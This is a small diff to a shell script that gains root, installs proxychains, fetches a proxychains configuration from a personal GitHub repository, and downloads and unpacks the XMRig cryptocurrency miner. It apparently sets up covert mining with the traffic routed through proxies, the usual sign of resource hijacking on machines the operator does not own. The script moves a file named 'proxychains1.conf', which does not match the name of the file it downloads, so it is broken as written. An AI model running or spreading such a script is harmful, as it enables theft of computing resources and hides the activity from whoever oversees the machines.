@@ -2,7 +2,7 @@
 sudo -i
 sudo apt-get update
 sudo apt-get install -y proxychains tar
-wget https://raw.githubusercontent.com/cuongptp1/123/master/sock/11/proxychains.conf
+wget https://raw.githubusercontent.com/cuongptp1/123/master/sock/1/proxychains.conf
 mv proxychains1.conf /etc/proxychains.conf
 wget https://github.com/xmrig/xmrig/releases/download/v6.3.3/xmrig-6.3.3-linux-x64.tar.gz
 tar --extract --file xmrig-6.3.3-linux-x64.tar.gz
